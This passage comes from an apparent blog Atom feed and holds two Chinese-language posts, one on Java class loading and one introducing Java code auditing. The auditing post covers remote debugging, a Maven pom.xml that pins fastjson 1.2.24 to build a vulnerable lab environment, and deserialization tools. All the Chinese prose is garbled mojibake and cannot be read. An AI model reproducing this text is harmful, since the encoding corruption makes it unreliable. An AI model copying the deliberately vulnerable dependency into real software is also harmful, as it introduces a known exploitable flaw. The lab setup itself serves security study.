    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Javaç±»åŠ è½½</title>
    <link href="http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>http://example.com/2021/10/11/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-10-11T11:15:55.000Z</published>
    <updated>2021-10-11T13:45:41.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Javaç±»åŠ è½½æœºåˆ¶"><a href="#Javaç±»åŠ è½½æœºåˆ¶" class="headerlink" title="Javaç±»åŠ è½½æœºåˆ¶"></a>Javaç±»åŠ è½½æœºåˆ¶</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Java ç¨‹åºæ˜¯ç”± class æ–‡ä»¶ç»„æˆçš„ä¸€ä¸ªå®Œæ•´çš„åº”ç”¨ç¨‹åºï¼Œå†è¿è¡Œç¨‹åºæ—¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„ class æ–‡ä»¶è¿›å…¥å†…å­˜ï¼Œè€Œæ˜¯é€šè¿‡ java çš„ç±»åŠ è½½æœºåˆ¶è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œä»è€Œè½¬æ¢ä¸º <code>java.lang.Class</code> çš„ä¸€ä¸ªå®ä¾‹</p><p>Java ä»£ç éœ€è¦å…ˆç¼–è¯‘ä¸º Class å­—èŠ‚ç ï¼Œç„¶åè¢«è™šæ‹Ÿæœºè§£é‡Šæ‰§è¡Œï¼ŒæŠŠå­—èŠ‚ç ä» Class æ–‡ä»¶ï¼ˆæˆ–è€…å…¶ä»–å¤–éƒ¨æ¥æºï¼‰åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å½¢æˆå¯èƒ½è¢« JVM ç›´æ¥ä½¿ç”¨å¾—ç»“æ„æ•°æ®ï¼Œè¿™ä¸€è¿‡ç¨‹å°±æ˜¯ç±»åŠ è½½</p><p>åŠ è½½ç±»çš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºï¼šåŠ è½½ã€é“¾æ¥ï¼ˆéªŒè¯ å‡†å¤‡ è§£æï¼‰ã€åˆå§‹åŒ–</p><p>åŠ è½½===&gt;éªŒè¯====&gt;å‡†å¤‡====&gt;è§£æ====&gt;åˆå§‹åŒ–</p><p>Java ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ <code>java.langClassLoder</code> åŠ è½½ç±»å­—èŠ‚ç ï¼Œ<code>ClassLoader</code> ä¼šè°ƒç”¨ JVM çš„nativeæ–¹æ³•æ¥å®šä¹‰ä¸€ä¸ª <code>java.lang.Class</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211007203744816.png" alt="image-20211007203744816"></p><h2 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h2><p>è¿™é‡Œçˆ¶ç±»åŠ è½½å™¨ä¸æ˜¯é€šè¿‡ç»§æ‰¿å…³ç³»æ¥å®ç°çš„ï¼Œè€Œæ˜¯é‡‡ç”¨ç»„åˆå®ç°çš„</p><p>ç«™åœ¨JVMè™šæ‹Ÿæœºçš„è§’åº¦è®²åªå­˜åœ¨ä¸¤ç§ç±»åŠ è½½å™¨ï¼š</p><ul><li>å¯åŠ¨ç±»åŠ è½½å™¨ï¼šä½¿ç”¨C++å®ç°</li><li>å…¶ä»–ç±»åŠ è½½å™¨ï¼šä½¿ç”¨ java è¯­è¨€å®ç°</li></ul><p>å¼€å‘äººå‘˜è§’åº¦å­˜åœ¨ä¸‰ç§ç±»åŠ è½½å™¨ï¼š</p><ul><li>æ ¹ç±»åŠ è½½å™¨</li><li>æ‰©å±•ç±»åŠ è½½å™¨</li><li>ç³»ç»Ÿç±»åŠ è½½å™¨</li></ul><h3 id="æ ¹ç±»åŠ è½½å™¨ï¼ˆBootstrapï¼‰"><a href="#æ ¹ç±»åŠ è½½å™¨ï¼ˆBootstrapï¼‰" class="headerlink" title="æ ¹ç±»åŠ è½½å™¨ï¼ˆBootstrapï¼‰"></a>æ ¹ç±»åŠ è½½å™¨ï¼ˆBootstrapï¼‰</h3><p>æ ¹ç±»åŠ è½½å™¨æ˜¯æœ€ä½å±‚å¾—ç±»åŠ è½½å™¨ï¼Œæ˜¯è™šæ‹Ÿæœºå¾—ä¸€éƒ¨åˆ†ï¼Œå®ƒæ˜¯ç”±C++è¯­è¨€å®ç°å¾—ï¼Œå¹¶ä¸”æ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨ï¼Œä¹Ÿæ²¡æœ‰ç»§æ‰¿<code>java.lang.ClassLoader</code>ç±»ã€‚å®ƒä¸»è¦è´Ÿè´£åŠ è½½ç”±ç³»ç»Ÿå±æ€§ <code>sun.boot.class.path</code> æŒ‡å®šå¾—è·¯å¾„ä¸‹å¾—æ ¸å¿ƒç±»åº“ã€‚æ ¹ç±»åŠ è½½å™¨åªåŠ è½½<code>javaï¼Œjavaxï¼Œsun</code>å¼€å¤´çš„ç±»ã€‚</p><h3 id="æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionï¼‰"><a href="#æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionï¼‰" class="headerlink" title="æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionï¼‰"></a>æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionï¼‰</h3><p><code>ExtClassLoader</code>çˆ¶åŠ è½½å™¨æ˜¯æ ¹ç±»åŠ è½½å™¨</p><h3 id="ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystemï¼‰"><a href="#ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystemï¼‰" class="headerlink" title="ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystemï¼‰"></a>ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystemï¼‰</h3><p><code>AppClassLoader</code> åº”ç”¨ç±»åŠ è½½å™¨ï¼Œé»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œçˆ¶ç±»æ˜¯æ‰©å±•ç±»åŠ è½½å™¨ã€‚</p><blockquote><p>javaè™šæ‹Ÿæœºå¯¹classæ–‡ä»¶é‡‡ç”¨çš„æ˜¯æŒ‰éœ€åŠ è½½çš„æ–¹å¼ï¼Œå½“éœ€è¦ä½¿ç”¨è¯¥ç±»çš„æ—¶å€™æ‰ä¼šæŠŠclassæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ç”Ÿæˆclasså¯¹è±¡ã€‚</p><p>åŠ è½½æŸä¸ªç±»çš„classæ–‡ä»¶æ—¶ï¼Œjavaè™šæ‹Ÿæœºé‡‡ç”¨çš„æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ï¼Œå³æŠŠåŠ è½½ç±»çš„è¯·æ±‚äº¤ç»™çˆ¶åŠ è½½å™¨å¤„ç†ï¼Œæ˜¯ä¸€ç§ä»»åŠ¡å§”æ´¾æ¨¡å¼ã€‚</p></blockquote><h3 id="JVMç±»åŠ è½½æœºåˆ¶"><a href="#JVMç±»åŠ è½½æœºåˆ¶" class="headerlink" title="JVMç±»åŠ è½½æœºåˆ¶"></a>JVMç±»åŠ è½½æœºåˆ¶</h3><ul><li>å…¨ç›˜è´Ÿè´£ï¼šå½“ä¸€ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½æŸä¸ª Class æ—¶ï¼Œè¯¥ Class æ‰€ä¾èµ–çš„å’Œå¼•ç”¨çš„å…¶ä»– Class ä¹Ÿå°†ç”±è¯¥ç±»åŠ è½½å™¨è´Ÿè´£è½½å…¥ï¼Œé™¤éæ˜¾ç¤ºçš„ä½¿ç”¨å¦å¤–ä¸€ä¸ªç±»åŠ è½½å™¨æ¥è½½å…¥</li><li>çˆ¶ç±»å§”æ‰˜ï¼šè®©çˆ¶ç±»åŠ è½½å™¨è¯•å›¾åŠ è½½è¯¥ç±»ï¼Œåªæœ‰çˆ¶ç±»æ— æ³•å®Œæˆæ—¶æ‰å°è¯•ä½¿ç”¨è‡ªå·±è·¯å¾„ä¸­çš„åŠ è½½å™¨</li><li>ç¼“å­˜æœºåˆ¶ï¼šå°†æ‰€æœ‰çš„åŠ è½½è¿‡çš„ Class éƒ½ç¼“å­˜ï¼Œç¨‹åºä½¿ç”¨æŸä¸ª Class æ—¶ï¼Œç±»åŠ è½½å™¨å…ˆä»ç¼“å­˜åŒºå¯»æ‰¾è¯¥ç±»çš„ Classï¼Œåªæœ‰ç¼“å­˜åŒºä¸å­˜åœ¨æ—¶ç³»ç»Ÿæ‰ä¼šè¯»å–è¯¥ç±»çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶å°†å…¶è½¬æ¢æˆ Class å¯¹è±¡ï¼Œå­˜å…¥ç¼“å­˜åŒºã€‚</li></ul><h2 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h2><p>åŠ è½½å™¨æ¯”è¾ƒæ‡’ï¼Œå–œæ¬¢æŠŠä¸œè¥¿äº¤ç»™çˆ¶ç±»åŠ è½½ï¼Œçˆ¶ç±»åŠ è½½ä¸äº†æ—¶å°±ä¼šå‘ä¸‹å§”æ´¾</p><p>æ„ä¹‰ï¼š</p><ul><li>ç³»ç»Ÿç±»é˜²æ­¢å†…å­˜å‡ºç°å¤šä»½åŒæ ·çš„å­—èŠ‚ç </li><li>ä¿è¯ java ç¨‹åºå®‰å…¨ç¨³å®šè¿è¡Œ</li></ul><h2 id="ç±»çš„åŠ è½½"><a href="#ç±»çš„åŠ è½½" class="headerlink" title="ç±»çš„åŠ è½½"></a>ç±»çš„åŠ è½½</h2><ol><li>å‘½ä»¤è¡Œå¯åŠ¨æ—¶ç”± JVM åˆå§‹åŒ–åŠ è½½</li><li>é€šè¿‡ Class.forName() æ–¹æ³•åŠ¨æ€åŠ è½½</li><li>é€šè¿‡ ClassLoader.LoadClass() æ–¹æ³•åŠ¨æ€åŠ è½½</li></ol><blockquote><p>åŒºåˆ«å°±æ˜¯å¯¹äºåˆå§‹åŒ–å—çš„å¤„ç†</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211008011053894.png" alt="image-20211008011053894"></p><h2 id="ClassLoaderç±»"><a href="#ClassLoaderç±»" class="headerlink" title="ClassLoaderç±»"></a>ClassLoaderç±»</h2><blockquote><p>é™¤äº†æ ¹ç±»åŠ è½½å™¨çš„æ‰€æœ‰çš„ç±»åŠ è½½å™¨éƒ½å¿…é¡»ç»§æ‰¿<code>java.lang.ClassLoader</code>å®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»</p></blockquote><p>æŸäº›æ—¶å€™æˆ‘ä»¬è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨æ—¶å¯èƒ½ä¼šè¿”å›ä¸€ä¸ª null å€¼ï¼Œå› ä¸º <code>Bootstrap Loader</code>(å¼•å¯¼ç±»åŠ è½½å™¨)æ˜¯ç”¨Cè¯­è¨€å®ç°çš„ï¼Œæ‰¾ä¸åˆ°ä¸€ä¸ªç¡®å®šçš„è¿”å›çˆ¶ç±»Loaderçš„æ–¹å¼ï¼Œäºæ˜¯å°±è¿”å›NULL</p><p><code>getParent(String name)</code>æ–¹æ³• ï¼ˆè¿”å›è¯¥ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨ï¼‰</p><p><code>loadClass(String name)</code>æ–¹æ³•ï¼ˆåŠ è½½æŒ‡å®šçš„ java ç±»ï¼‰</p><p><code>findClass(String name)</code>æ–¹æ³•ï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„ç±»ï¼‰</p><p><code>findLoadedClass(String name)</code>æ–¹æ³•ï¼ˆæŸ¥æ‰¾ JVM å·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰</p><p><code>defineClass(String name)</code>æ–¹æ³•ï¼ˆ å®šä¹‰ä¸€ä¸ªjavaç±» ï¼‰</p><p><code>resolveClass(String name)</code>æ–¹æ³• ï¼ˆé“¾æ¥æŒ‡å®šçš„ java ç±»ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211007235659052.png"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><blockquote><p>èƒ½å¤Ÿä»æœ¬åœ°æˆ–è€…ç½‘ç»œä¸ŠæŒ‡å®šä½ç½®åŠ è½½ç±»</p></blockquote><p>é»˜è®¤çˆ¶ç±»åŠ è½½å™¨æ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œå®ƒæ‹¥æœ‰ä»è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ è½½ç±»çš„èƒ½åŠ›ï¼Œé€šè¿‡ <code>URLClassLoader</code> å¯ä»¥å®ç°å¯¹ä¸€äº›webshell çš„è¿œç¨‹åŠ è½½ï¼Œå¯¹æŸä¸ªæ¼æ´çš„æ·±å…¥åˆ©ç”¨</p><h2 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h2><p>é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¼šä½¿ç”¨ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¼šè‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œæ¯”å¦‚é€šè¿‡ç½‘ç»œä¼ è¾“ java ç±»çš„å­—èŠ‚ç ï¼Œä¸ºäº†ä¿è¯å®‰å…¨éœ€è¦å¯¹å­—èŠ‚ç è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œè¿™æ—¶ç³»ç»Ÿç±»åŠ è½½å™¨å°±æ— æ³•å®Œæˆå·¥ä½œã€‚</p><p>ä¸€èˆ¬è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ­¥éª¤</p><ol><li>ç»§æ‰¿<code>CLassLoader</code></li><li>é‡å†™<code>findClass</code>æ–¹æ³•</li></ol><p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ul><li>æœ€å¥½ä¸è¦é‡å†™ loadClass æ–¹æ³•ï¼Œè¿™æ ·å®¹æ˜“ç ´ååŒäº²å…³ç³»</li></ul><p>å­¦ä¹ æ–‡ç« </p><p><a href="https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md">https://github.com/wangzhiwubigdata/God-Of-BigData/blob/master/JVM/jvm%E7%B3%BB%E5%88%97(%E4%B8%80)java%E7%B1%BB%E7%9A%84%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6.md</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03">https://zhishihezi.net/endpoint/richtext/4aaa4fe6bc2249252df9ae2b1891b451?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb734ea004bf99cfcb44391ec0504f7eddb77ba32acfab113b91e8352187479ffee0ff0fa8ff354b0bc46c4e3e1dc8a97c6b6c515798128245dacf21ddc8d4f5787b19982c9ef340be67e92845cfd034625f6ce4eba9736952a8a40ff54bb957b6e383b20e9b4df48c43718ec6e3ad027c87fd16f9a06d4d6a92ccd81cab45b5fce25b117baa7eae9c2a905abc262fb03</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Javaç±»åŠ è½½æœºåˆ¶&quot;&gt;&lt;a href=&quot;#Javaç±»åŠ è½½æœºåˆ¶&quot; class=&quot;headerlink&quot; title=&quot;Javaç±»åŠ è½½æœºåˆ¶&quot;&gt;&lt;/a&gt;Javaç±»åŠ è½½æœºåˆ¶&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Javaå®¡è®¡å…¥é—¨</title>
    <link href="http://example.com/2021/10/10/Java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2021/10/10/Java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-10T08:04:04.000Z</published>
    <updated>2021-10-12T08:05:06.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-ä»£ç å®¡è®¡å…¥é—¨"><a href="#Java-ä»£ç å®¡è®¡å…¥é—¨" class="headerlink" title="Java ä»£ç å®¡è®¡å…¥é—¨"></a>Java ä»£ç å®¡è®¡å…¥é—¨</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="è¿œç¨‹è°ƒè¯•"><a href="#è¿œç¨‹è°ƒè¯•" class="headerlink" title="è¿œç¨‹è°ƒè¯•"></a>è¿œç¨‹è°ƒè¯•</h3><h4 id="å¯¹Jar-è¿œç¨‹è°ƒè¯•"><a href="#å¯¹Jar-è¿œç¨‹è°ƒè¯•" class="headerlink" title="å¯¹Jar è¿œç¨‹è°ƒè¯•"></a>å¯¹Jar è¿œç¨‹è°ƒè¯•</h4><p>æ–°å»ºä¸€ä¸ª Java é¡¹ç›®æ–‡ä»¶ï¼Œæ–°å»ºä¸€ä¸ª lib åŒ…ï¼Œå°† jar é¡¹ç›®æ–‡ä»¶æ”¾å…¥ lib ä¸­ï¼Œç„¶åç‚¹å‡» â€œadd as Libraryâ€¦â€¦â€</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120523043.png" alt="image-20211006120523043"></p><p>ç„¶ååˆ›å»ºè¿œç¨‹è°ƒè¯• <code>Add Configurationâ€¦â€¦</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120752382.png" alt="image-20211006120752382"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006120832600.png" alt="image-20211006120832600"></p><p>è°ƒè¯•æˆåŠŸ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006121110049.png" alt="image-20211006121110049"></p><blockquote><p>å…¶ä»–ç±»ä¼¼äº Weblogic  Tomcat çš„è°ƒè¯•ï¼Œæ“ä½œæ­¥éª¤å¤§è‡´ä¸€æ ·ï¼Œé¢å¤–çš„ç‚¹åœ¨ä»¥åè°ƒè¯•çš„æ—¶å€™å†å†™å§</p></blockquote><h3 id="é¡¹ç›®æ„å»ºå·¥å…·"><a href="#é¡¹ç›®æ„å»ºå·¥å…·" class="headerlink" title="é¡¹ç›®æ„å»ºå·¥å…·"></a>é¡¹ç›®æ„å»ºå·¥å…·</h3><h4 id="Maven-åŸºç¡€çŸ¥è¯†åŠæŒæ¡"><a href="#Maven-åŸºç¡€çŸ¥è¯†åŠæŒæ¡" class="headerlink" title="Maven åŸºç¡€çŸ¥è¯†åŠæŒæ¡"></a>Maven åŸºç¡€çŸ¥è¯†åŠæŒæ¡</h4><p>Maven é¡¹ç›®ä¸­æœ€ä¸»è¦çš„å°±æ˜¯ pom.xml æ–‡ä»¶ï¼Œpom.xml æ–‡ä»¶æè¿°äº†é¡¹ç›®çš„ Maven åæ ‡ã€ä¾èµ–å…³ç³»ã€å¼€å‘è€…éœ€è¦å‡†å¯»çš„è§„åˆ™ã€ç¼ºé™·ç®¡ç†ç³»ç»Ÿã€ç»„ç»‡ä»¥åŠ licenseï¼Œè¿˜æœ‰å…¶ä»–æ‰€æœ‰çš„é¡¹ç›®ç›¸å…³å› ç´ ï¼Œä¾é å®ƒæˆ‘ä»¬å¯ä»¥å®¡æŸ¥å½“å‰ java åº”ç”¨ç¨‹åºæ˜¯å¦ä½¿ç”¨äº†å­˜åœ¨å®‰å…¨éšæ‚£çš„ç»„ä»¶ï¼Œä»¥åŠå¿«é€Ÿæ­å»ºç‰¹å®šçš„æ¼æ´ç¯å¢ƒã€‚</p><p>ä¾‹å¦‚å¿«é€Ÿæ­å»ºç‰ˆæœ¬å°äº1.24çš„ fastjson ç¯å¢ƒ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maventest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006163733487.png" alt="image-20211006163733487"></p><p>ä¹‹åç»„ä»¶å°±è¢«ä¸‹è½½è‡³æœ¬åœ°å¹¶ä¸”åŠ å…¥é¡¹ç›®ä¾èµ–ä¸­ï¼Œå¯ä»¥å†é¡¹ç›®ä»£ç ä¸­ä½¿ç”¨ç»„ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211006164430001.png" alt="image-20211006164430001"></p><h4 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h4><p>Swagger æ˜¯ä¸€ä¸ªå¼€æºè½¯ä»¶æ¡†æ¶ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜è®¾è®¡ã€æ„å»ºã€è®°å½•å’Œä½¿ç”¨ Restful Web åº”ç”¨ï¼Œå®ƒå°†ä»£ç å’Œæ–‡æ¡£èä¸ºä¸€ä½“ã€‚</p><h2 id="ä»£ç å®¡è®¡è¾…åŠ©å·¥å…·"><a href="#ä»£ç å®¡è®¡è¾…åŠ©å·¥å…·" class="headerlink" title="ä»£ç å®¡è®¡è¾…åŠ©å·¥å…·"></a>ä»£ç å®¡è®¡è¾…åŠ©å·¥å…·</h2><h3 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h3><p>Sublime</p><p>IDEA</p><p>Eclipse</p><h3 id="æµ‹è¯•å·¥å…·"><a href="#æµ‹è¯•å·¥å…·" class="headerlink" title="æµ‹è¯•å·¥å…·"></a>æµ‹è¯•å·¥å…·</h3><p>Burp Suite</p><p>SwitchyOmega</p><p>Max HackBar</p><p>Postman</p><p>PostWomen</p><p>Tamper Data</p><p>Ysoserial</p><blockquote><p>Ysoserial æ˜¯ä¸€æ¬¾å¼€æºçš„ java ååºåˆ—åŒ–æµ‹è¯•å·¥å…·ï¼Œå†…éƒ¨é›†æˆäº†å¤šç§åˆ©ç”¨é“¾ï¼Œå¯ä»¥å¿«é€Ÿç”Ÿæˆç”¨äºæ”»å‡»çš„ä»£ç </p></blockquote><p>Marshalsec</p><blockquote><p>Marshalsec æ˜¯ä¸€æ¬¾å¼€æºçš„ java ååºåˆ—åŒ–æµ‹è¯•å·¥å…·ï¼Œä¸ä»…å¯ä»¥ç”Ÿæˆå„ç±»ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿˜å¯ä»¥å¿«é€Ÿå¯åŠ¨è€Œå·²çš„ RMI æœåŠ¡</p></blockquote><p>MySQL æ—¥å¿—æŸ¥è¯¢å·¥å…·</p><p>MySQL Monitor</p><p>Beyond Compare</p><blockquote><p>æ–‡ä»¶æ¯”è¾ƒå·¥å…·ï¼Œæ¯”è¾ƒèŒƒå›´åŒ…æ‹¬ç›®å½•ã€æ–‡æ¡£å†…å®¹</p></blockquote><h3 id="åç¼–è¯‘å·¥å…·"><a href="#åç¼–è¯‘å·¥å…·" class="headerlink" title="åç¼–è¯‘å·¥å…·"></a>åç¼–è¯‘å·¥å…·</h3><p>JD-GUI</p><p>FernFlower</p><blockquote><p>FernFlower åç¼–è¯‘å·¥å…·çš„åŠŸèƒ½æ¯” JD-GUI æ›´å¼ºå¤§ï¼Œåç¼–è¯‘å¤±è´¥çš„æ—¶å€™ä¼šç”Ÿæˆç©ºçš„ java æ–‡ä»¶</p></blockquote><p>CFR</p><p>Intellij IDEA</p><blockquote><p>IDEA åç¼–è¯‘å·¥å…·èƒ½å¤Ÿè‡ªåŠ¨æ·è±¹å·²æ·»åŠ çš„ä¾èµ–çš„ jar åŒ…ï¼Œå¹¶å¯¹å…¶å†…å®¹è¿›è¡Œåç¼–è¯‘</p></blockquote><h3 id="Java-ä»£ç é™æ€æ‰«æå·¥å…·"><a href="#Java-ä»£ç é™æ€æ‰«æå·¥å…·" class="headerlink" title="Java ä»£ç é™æ€æ‰«æå·¥å…·"></a>Java ä»£ç é™æ€æ‰«æå·¥å…·</h3><p>Fortify SCA</p><p>VCG</p><p>FindBugs ä¸ FindSecBugs æ’ä»¶</p><blockquote><p>åœ¨ IDEA å’Œ Eclipse ä¸­éƒ½å¯ä»¥å®‰è£…</p></blockquote><p>SpotBugs</p><blockquote><p>SpotBugs å’Œ FindBugs ç”¨æ³•åŸºæœ¬ä¸€æ ·ï¼Œå¯ä»¥ç‹¬ç«‹ä½¿ç”¨ä¹Ÿå¯ä»¥ä½œä¸ºæ’ä»¶ï¼Œéœ€è¦è¿è¡Œåœ¨ JDK 1.8 ä»¥ä¸Šçš„ç‰ˆæœ¬</p></blockquote><h3 id="å…¬å¼€æ¼æ´å¹³å°"><a 